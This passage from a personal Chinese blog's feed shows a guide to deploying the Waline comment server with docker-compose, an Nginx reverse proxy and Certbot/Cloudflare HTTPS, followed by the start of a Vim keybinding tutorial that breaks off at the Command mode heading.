&lt;p&gt;waline文档指引我们导入&lt;a href=&quot;https://github.com/walinejs/waline/blob/main/assets/waline.sql&quot;&gt;waline.sql&lt;/a&gt;文件,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一开始这个文件导入会出错,因为含有非法的SQL语句.我已向源项目提交PR.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;导入后,确保你的服务器上已经下载好了waline的仓库:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;git clone https://github.com/walinejs/waline.git
cd waline/packages/server
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;编辑docker-compose文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo vim docker-compose.yml
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# docker-compose.yml
version: &amp;#39;3&amp;#39;

services:
  waline:
    container_name: waline
    image: lizheming/waline:latest
    restart: always
    ports:
      - 172.17.0.1:8360:8360
    volumes:
      - ${PWD}/data:/app/data
    environment:
      TZ: &amp;#39;Asia/Shanghai&amp;#39;
      MYSQL_HOST: &amp;quot;REMOTE DATABASE HOST&amp;quot;
      MYSSQL_PORT: 3306
      MYSQL_DB: &amp;quot;waline&amp;quot;
      MYSQL_USER: &amp;quot;USERXXX&amp;quot;
      MYSQL_PASSWORD: &amp;quot;PSWXXX&amp;quot;
      MYSQL_SSL: &amp;quot;true&amp;quot;
      SITE_NAME: &amp;quot;可不填&amp;quot;
      SITE_URL: &amp;#39;可不填&amp;#39;
      AUTHOR_EMAIL: &amp;#39;YOUR EMAIL&amp;#39;
      IPQPS: 30 # 参考服务端配置
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; 参考&lt;a href=&quot;https://waline.js.org/reference/server/env.html&quot;&gt;服务端环境变量 | Waline&lt;/a&gt;可以自己添加
编写好配置文件后&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;最好按我的来,用docker-compose,不要用文档上的docker build,不得不说,docker部署这部分的文档写得混乱&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; 成功后,docker容器运行在8360端口上,且外部不可通过IP:8360访问到,比较安全.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;netstat -tln
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;172.17.0.1:8360处于LISTEN状态.&lt;/p&gt;
&lt;h1&gt;配置Nginx&lt;/h1&gt;
&lt;p&gt;我的网站一开始是直接IP访问80端口的,现在,我们可以改用域名访问,稍后,再升级为HTTPS.
首先,nginx的配置文件都在/etc/nginx里面&lt;/p&gt;
&lt;p&gt;conf.d,site-avalible,site-enable都存放了server配置文件.网页展示的site-enable里.Nginx默认的页面放在site-enable,并且site-avalible里也有一份.我的实践方式是在site-avalible中编辑配置文件,然后在site-enable中创建软连接指着site-avalible的文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cd ./site-enable
ln -s ../site-avalible/astro astro
ln -s ../site-avalible/waline waline
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;编写类似如下的内容:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nginx&quot;&gt;server {
	listen 80;
    server_name www.example.com example.com;  # 你的域名或者 IP 地址

    root /path/to/astroProject/dist;  # 指向 Astro 构建的 dist 目录
    index index.html;

    # 配置静态资源缓存（可选）
    location / {
        try_files $uri $uri/ =404;
    }

    # 配置 gzip 压缩（可选，提高性能）
    gzip on;
    gzip_types text/plain application/xml text/css application/javascript;
    gzip_min_length 1000;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;保存退出后,测试并重启nginx&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo nginx -t
sudo systemctl restart nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Nginx反代Waline&lt;/h2&gt;
&lt;p&gt;还记得我们在Frosti里面把SERVER_URL设置为waline.example.com吗?访问这个URL,实际上是访问的80 或443端口,而不是docker运行的8360端口,而且docker容器只对内网开放.所以,像上面那样配置是不能直接提供服务的.&lt;/p&gt;
&lt;p&gt;我们要做的是像一个路由器那样,把外来的请求转发到内网的另一个地方去,这就叫&lt;strong&gt;反向代理&lt;/strong&gt;,是Nginx一个很强大的功能.&lt;/p&gt;
&lt;p&gt;在上面的docker-compose.yml文件中,我们把172.17.0.1:8360映射到镜像的8360端口,netstat也显示容器监听172.17.0.1的8360端口,所以我们要做的就是把来自域名waline.example.com的请求发送到172.17.0.1:8360去.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nginx&quot;&gt;sever {
	listen 80;
	server_name waline.example.com;

	location / {
		proxy_pass http://172.17.0.1:8360;
		proxy_http_version 1.1;
		proxy_set_header Host $host;
		proxy_set_header X-Real-IP $remote_addr;
		proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header X-Forwarded-Proto $scheme;
		proxy_set_header REMOTE-HOST $remote_addr;
		add_header X-Cache $upstream_cache_status;
		add_header Cahce-Control no-cache;
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样部署后,登录Waline管理页面就能创建管理账号(第一个登录的用户会被设置为管理员).&lt;/p&gt;
&lt;h3&gt;禁止用户访问Waline的demo页面&lt;/h3&gt;
&lt;p&gt;上述配置全部成功后,访问反向代理的自定义域名&lt;code&gt;waline.example.com&lt;/code&gt;时,会显示 Waline 的 demo 页面,这个页面不应展示.&lt;/p&gt;
&lt;p&gt;修改配置文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nginx&quot;&gt;location ~* ^/.+ {
	#   原配置
	...
}
location = / {
	return 403;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过正则表达式匹配,只有后面跟有request url的请求才被转发,否则返回403 Forbidden状态码.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;配置完成后,记得重启nginx服务哦~&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;注册HTTPS证书&lt;/h1&gt;
&lt;p&gt;以下操作都是Deepseek告诉我的,基于我已经配置好HTTP服务,实测可用.如果你没有HTTP服务,不知道这只 &lt;code&gt;certbot&lt;/code&gt; 会怎么处理.🤖&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;em&gt;DeepSeek - 探索未至之境&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;以下是详细的步骤，指导您如何为使用 &lt;strong&gt;Nginx + Cloudflare&lt;/strong&gt; 的网站配置 HTTPS：&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;1. 在 Cloudflare 中启用 HTTPS&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;Cloudflare 提供免费的 SSL/TLS 证书，并自动为您的域名启用 HTTPS。&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;步骤 1：登录 Cloudflare 控制面板&lt;/strong&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;访问 &lt;a href=&quot;https://www.cloudflare.com/&quot;&gt;Cloudflare&lt;/a&gt; 并登录您的账户。&lt;/li&gt;
&lt;li&gt;选择您的域名。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4&gt;&lt;strong&gt;步骤 2：配置 SSL/TLS 模式&lt;/strong&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;点击 &lt;strong&gt;SSL/TLS&lt;/strong&gt; → &lt;strong&gt;Overview&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;选择 SSL/TLS 模式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Flexible&lt;/strong&gt;：仅加密浏览器到 Cloudflare 的流量（不推荐）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Full&lt;/strong&gt;：加密浏览器到 Cloudflare 和 Cloudflare 到服务器的流量（服务器可使用自签名证书）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Full (Strict)&lt;/strong&gt;：加密全链路流量（服务器需安装有效证书，推荐选择此项）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;选择 &lt;code&gt;Full&lt;/code&gt;&lt;a href=&quot;%E6%88%91%E9%80%89%E7%9A%84%E6%98%AFFull&quot;&gt;^1&lt;/a&gt; 或 &lt;code&gt;Full (Strict)&lt;/code&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;启用 &lt;strong&gt;Always Use HTTPS&lt;/strong&gt;（强制所有 HTTP 请求跳转到 HTTPS）&lt;a href=&quot;Certbot%F0%9F%A4%96%E5%9C%A8Nginx%E4%B8%AD%E8%87%AA%E5%8A%A8%E5%A4%84%E7%90%86,%E6%89%80%E4%BB%A5%E6%88%91%E6%9C%AA%E8%AE%BE%E7%BD%AE&quot;&gt;^5&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;strong&gt;2. 为服务器获取 SSL 证书&lt;/strong&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;strong&gt;使用 Let&amp;#39;s Encrypt 免费证书（推荐）&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Let&amp;#39;s Encrypt 提供免费的 SSL 证书，并通过 Certbot 工具自动化管理。&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;步骤 1：安装 Certbot&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;在服务器上执行以下命令（以 Ubuntu/Debian 为例）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt update
sudo apt install certbot python3-certbot-nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;strong&gt;步骤 2：获取证书&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;运行 Certbot 并自动配置 Nginx：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo certbot --nginx -d example.com -d www.example.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（将 &lt;code&gt;example.com&lt;/code&gt; 替换为您的域名）&lt;/p&gt;
&lt;p&gt;Certbot 会：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;自动验证域名所有权。&lt;/li&gt;
&lt;li&gt;生成 SSL 证书（保存在 &lt;code&gt;/etc/letsencrypt/live/example.com/&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;自动修改 Nginx 配置文件以启用 HTTPS。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4&gt;&lt;strong&gt;步骤 3：验证证书自动续期&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Let&amp;#39;s Encrypt 证书有效期为 90 天，Certbot 会自动续期。手动测试续期：&lt;a href=&quot;%E6%88%91%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95%E7%BB%AD%E6%9C%9F%E5%A4%B1%E8%B4%A5%E4%BA%86...%E4%BD%86%E6%98%AF%E6%9C%80%E5%90%8E%E6%9C%89%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95,%E6%89%8B%E5%8A%A8%E5%BC%BA%E5%88%B6%E7%BB%AD%E6%9C%9F&quot;&gt;^2&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo certbot renew --dry-run
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;&lt;strong&gt;3. 配置 Nginx 支持 HTTPS&lt;/strong&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;strong&gt;步骤 1：检查 Nginx 配置文件&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Certbot 已自动修改配置，但需手动检查。&lt;br&gt;打开配置文件（通常位于 &lt;code&gt;/etc/nginx/sites-available/default&lt;/code&gt;）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo nano /etc/nginx/sites-available/default
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;strong&gt;步骤 2：确保 HTTPS 配置正确&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;配置文件应包含类似以下内容：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nginx&quot;&gt;server {
    listen 80;
    server_name example.com www.example.com;
    return 301 https://$host$request_uri;  # 强制跳转到 HTTPS
}

server {
    listen 443 ssl;
    server_name example.com www.example.com;

    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;

    root /var/www/html;
    index index.html index.htm;

    location / {
        try_files $uri $uri/ =404;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;strong&gt;步骤 3：测试并重启 Nginx&lt;/strong&gt;&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo nginx -t          # 检查配置语法
sudo systemctl restart nginx  # 重启 Nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;strong&gt;4. 配置 Cloudflare 的 SSL 证书源&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;如果选择 &lt;strong&gt;Full (Strict) 模式&lt;/strong&gt;，需确保 Cloudflare 信任服务器证书。&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;步骤 1：在 Cloudflare 上传原始证书（可选）&lt;/strong&gt;&lt;a href=&quot;%E6%88%91%E6%B2%A1%E5%81%9A%E8%BF%99%E4%B8%80%E6%AD%A5&quot;&gt;^3&lt;/a&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;进入 &lt;strong&gt;SSL/TLS&lt;/strong&gt; → &lt;strong&gt;Origin Server&lt;/strong&gt; → &lt;strong&gt;Create Certificate&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;生成并下载证书（包含 &lt;code&gt;.pem&lt;/code&gt; 文件）。&lt;/li&gt;
&lt;li&gt;将证书上传到服务器，并更新 Nginx 配置：&lt;pre&gt;&lt;code class=&quot;language-nginx&quot;&gt;ssl_certificate /path/to/cloudflare-origin.crt;
ssl_certificate_key /path/to/cloudflare-origin.key;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;strong&gt;5. 验证 HTTPS 是否生效&lt;/strong&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;在浏览器中访问 &lt;code&gt;https://example.com&lt;/code&gt;，检查是否显示 &lt;strong&gt;安全锁标志&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;使用 &lt;a href=&quot;https://www.ssllabs.com/ssltest/&quot;&gt;SSL Labs 测试工具&lt;/a&gt; 检查 SSL 配置评分（目标为 A 或 A+）。&lt;a href=&quot;%E7%BB%93%E6%9E%9C%E4%B8%BAB%F0%9F%98%85&quot;&gt;^4&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;strong&gt;6. 常见问题解决&lt;/strong&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;strong&gt;问题 1：浏览器提示“不安全”&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;原因&lt;/strong&gt;：网站中存在混合内容（HTTP 资源）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;解决&lt;/strong&gt;：&lt;ol&gt;
&lt;li&gt;确保所有资源（图片、CSS、JS）使用 HTTPS 链接。&lt;/li&gt;
&lt;li&gt;在 Cloudflare 启用 &lt;strong&gt;Automatic HTTPS Rewrites&lt;/strong&gt;（SSL/TLS → Edge Certificates）。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;strong&gt;问题 2：Nginx 启动失败&lt;/strong&gt;&lt;a href=&quot;%E6%88%91%E7%9A%84Shadowsocks%F0%9F%9A%80%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%B8%80%E5%BC%80%E5%A7%8B%E5%8D%A0%E7%94%A8%E4%BA%86443%E7%AB%AF%E5%8F%A3,%E4%BA%A7%E7%94%9F%E4%BA%86%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5%E7%9A%84%E7%8E%B0%E8%B1%A1&quot;&gt;^6&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;原因&lt;/strong&gt;：配置文件语法错误或端口冲突。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;解决&lt;/strong&gt;：&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo nginx -t  # 检查错误日志
sudo systemctl status nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;strong&gt;问题 3：证书续期失败&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;原因&lt;/strong&gt;：Certbot 无法自动续期。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;解决&lt;/strong&gt;：&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo certbot renew --force-renewal  # 手动强制续期
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;strong&gt;总结&lt;/strong&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;在 Cloudflare 启用 &lt;strong&gt;Full (Strict) SSL&lt;/strong&gt; 并强制 HTTPS。&lt;/li&gt;
&lt;li&gt;使用 Certbot 自动获取并安装 Let&amp;#39;s Encrypt 证书。&lt;/li&gt;
&lt;li&gt;配置 Nginx 支持 HTTPS 并重启服务。&lt;/li&gt;
&lt;li&gt;验证 HTTPS 生效并解决常见问题。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;完成以上步骤后，您的网站将通过 HTTPS 安全访问，数据全程加密，用户信任度和 SEO 排名也会提升。如果有具体问题，请随时告诉我！ 😊&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;注意此时waline.example.com采用HTTPS,但docker配置依然使用&lt;a href=&quot;http://172.17.0.1:8360&quot;&gt;http://172.17.0.1:8360&lt;/a&gt; ,TLS加密是存在于客户端(浏览器)和网站服务器之间的.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;如果Nginx与Waline交互过程中出现莫名其妙的错误,可查看/var/log/nginx/error.log文件,说不定能快速定位原因.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;总结&lt;/h1&gt;
&lt;p&gt;至此,我们的网站终于大功告成了!🤩&lt;/p&gt;
&lt;p&gt;但是搜索引擎(Google和百度等)的爬虫目前还没有找到我们的网站.可以向搜索引擎反馈,加快这一过程.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;自由,开放,是互联网的精神.希望每个人都能在互联网上展示自信多彩的自己!&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Tue, 25 Mar 2025 16:00:00 GMT</pubDate></item><item><title>Vim使用教程</title><link>https://tankimzeg.top/blog/vim-tutorial/</link><guid isPermaLink="true">https://tankimzeg.top/blog/vim-tutorial/</guid><description>随时查阅</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/vim-tutorial/&quot;&gt;https://tankimzeg.top/blog/vim-tutorial/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1s4421A7he&quot;&gt;【Vim】可能是B站最系统的Vim教程&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Edit text at the speed of thought.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;之前粗略学习了一下,已经在我的VScode,Obsdian中投入使用.但感觉不够高效,遂补齐这一课.&lt;/em&gt;&lt;/p&gt;
&lt;h1&gt;Vim模式&lt;/h1&gt;
&lt;p&gt;Vim主要有4中模式:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Normal&lt;/li&gt;
&lt;li&gt;Insert&lt;/li&gt;
&lt;li&gt;Command&lt;/li&gt;
&lt;li&gt;Visual&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Normal模式&lt;/h1&gt;
&lt;h2&gt;移动&lt;/h2&gt;
&lt;h3&gt;基本移动&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;hjkl&lt;/code&gt;: 上下左右&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gg&lt;/code&gt;: 跳到第一行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;G&lt;/code&gt;: 跳到最后一行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ctrl-U&lt;/code&gt; / &lt;code&gt;Ctrl-B&lt;/code&gt;: 往上翻半页/一页&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ctrl-D&lt;/code&gt; / &lt;code&gt;Ctrl-F&lt;/code&gt;: 往下翻半页/一页&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{lineno}gg&lt;/code&gt;: 跳到&lt;code&gt;lineno&lt;/code&gt;行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;zz/zt/zb&lt;/code&gt;: 光标设置为屏幕居中/屏幕第一行/屏幕最后一行&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;基于单词的移动&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;w&lt;/code&gt;: 跳转到下一处单词的开头&lt;/li&gt;
&lt;li&gt;&lt;code&gt;b&lt;/code&gt;: 跳转到上一处单词的开头&lt;/li&gt;
&lt;li&gt;&lt;code&gt;e&lt;/code&gt;: 跳转到下一处单词的结尾&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ge&lt;/code&gt;: 跳转到上一处单词的结尾&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wbe&lt;/code&gt;的单词会以标点为界,大写版本&lt;code&gt;WBE&lt;/code&gt;对应的单词是连续的非空字符&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;基于搜索的移动&lt;/h3&gt;
&lt;p&gt;行内搜索:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;f{char}&lt;/code&gt;/&lt;code&gt;t{char}&lt;/code&gt;: 跳转到本行下一个&lt;code&gt;char&lt;/code&gt;字符出现处/出现前&lt;/li&gt;
&lt;li&gt;&lt;code&gt;;&lt;/code&gt;/&lt;code&gt;,&lt;/code&gt;: 快速向后/向前重复&lt;code&gt;ft&lt;/code&gt;查找&lt;/li&gt;
&lt;li&gt;&lt;code&gt;F{char}&lt;/code&gt;/&lt;code&gt;T{char}&lt;/code&gt;: 往前搜索&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;文件中搜索:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/{pattern}&lt;/code&gt;: 跳转到本文件中下一个&lt;code&gt;pattern&lt;/code&gt;出现处&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?{pattern}&lt;/code&gt;: 跳转到本文件中上一个&lt;code&gt;pattern&lt;/code&gt;出现处&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{pattern}&lt;/code&gt;: 可以是正则表达式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt;: 等价于 &lt;code&gt;/{当前光标下的单词}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nN&lt;/code&gt;: 快速重复&lt;code&gt;/&lt;/code&gt;查找,&lt;code&gt;n&lt;/code&gt;向后;&lt;code&gt;N&lt;/code&gt;向前&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;基于标记的移动&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;m{mark}&lt;/code&gt;: 把当前位置标记为{mark}&lt;/li&gt;
&lt;li&gt;&lt;code&gt;`{mark}&lt;/code&gt; : 跳转到名为{mark}的标记处
内置标记:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;``&lt;/code&gt;:上次跳转的位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;`.&lt;/code&gt;: 上次修改的位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;`^&lt;/code&gt;: 上次插入的位置&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;其他实用的跳转&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;^&lt;/code&gt; / &lt;code&gt;$&lt;/code&gt;: 跳转到本行的开始/ 结尾处&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%&lt;/code&gt;: 跳转到匹配的配对符号处(小括号,中括号,大括号,注释)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Operator+Motion&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;{operator}{motion}&lt;/code&gt;: 一次编辑操作
上面任何移动都视为一次motion.
常用的操作符:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;c&lt;/code&gt;: 修改(删除内容并进入Insert模式)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;d&lt;/code&gt;: 删除&lt;/li&gt;
&lt;li&gt;&lt;code&gt;y&lt;/code&gt;: 复制&lt;/li&gt;
&lt;li&gt;&lt;code&gt;v&lt;/code&gt;: 选中,进入Visual模式&lt;/li&gt;
&lt;li&gt;连按两次,作用于当前行.(&lt;code&gt;yy/dd/cc&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;批量操作&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;{count}{action}&lt;/code&gt;:重复执行操作
action可以是移动也可以是编辑操作&lt;/p&gt;
&lt;h2&gt;Redo/Undo&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt;: 重复上一次修改&lt;/li&gt;
&lt;li&gt;&lt;code&gt;u&lt;/code&gt;: 撤销上一次修改&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;Ctrl&amp;gt;-r&lt;/code&gt;: 重做上一次修改&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Operator+textobject&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;{operator}{textobject}&lt;/code&gt;:文本对象操作
{textobject}: 语义化文本片段
格式: &lt;code&gt;i&lt;/code&gt; / &lt;code&gt;a&lt;/code&gt; + 对象
常用的对象:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;w&lt;/code&gt; / &lt;code&gt;W&lt;/code&gt;, &lt;code&gt;s&lt;/code&gt;, &lt;code&gt;p&lt;/code&gt;: 单词,句子,段落&lt;/li&gt;
&lt;li&gt;&lt;code&gt;(&lt;/code&gt; / &lt;code&gt;)&lt;/code&gt; , &lt;code&gt;[&lt;/code&gt; / &lt;code&gt;]&lt;/code&gt; , &lt;code&gt;{&lt;/code&gt; / &lt;code&gt;}&lt;/code&gt; , &lt;code&gt;&amp;lt;&lt;/code&gt; / &lt;code&gt;&amp;gt;&lt;/code&gt; , &lt;code&gt;&amp;#39;&lt;/code&gt; / &lt;code&gt;&amp;quot;&lt;/code&gt;: 配对符定义的对象
&lt;code&gt;i&lt;/code&gt; 代表内部, &lt;code&gt;a&lt;/code&gt;包括周围的空格或配对符&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Operator操作符补充&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt; / &lt;code&gt;&amp;lt;&lt;/code&gt;: 缩进/取消缩进&lt;/li&gt;
&lt;li&gt;&lt;code&gt;J&lt;/code&gt;:join, 连接两行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gu&lt;/code&gt;/&lt;code&gt;gU&lt;/code&gt;/&lt;code&gt;g~&lt;/code&gt;:转小写/转大写/翻转大小写&lt;/li&gt;
&lt;li&gt;&lt;code&gt;g&amp;lt;Ctrl-A&amp;gt;&lt;/code&gt;: 创建递增序列&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;Ctrl-a&amp;gt;&lt;/code&gt;/&lt;code&gt;&amp;lt;Ctrl-x&amp;gt;&lt;/code&gt;:增加/减小数字&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Insert模式&lt;/h1&gt;
&lt;p&gt;Normal模式下,通过特定命令进入Insert模式:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;i&lt;/code&gt;:在光标之前开始输入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;I&lt;/code&gt;: 在本行开头开始输入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;a&lt;/code&gt;: 在光标之后开始输入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;A&lt;/code&gt;: 在本行末尾开始输入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;o&lt;/code&gt;:下方插入新的一行,然后开始输入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;O&lt;/code&gt;: 上方插入新的一行,然后开始输入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s&lt;/code&gt;: 删除当前光标字符,然后开始输入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;S&lt;/code&gt;: 删除当前行,然后开始输入&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Command模式&lt;/h1&gt;
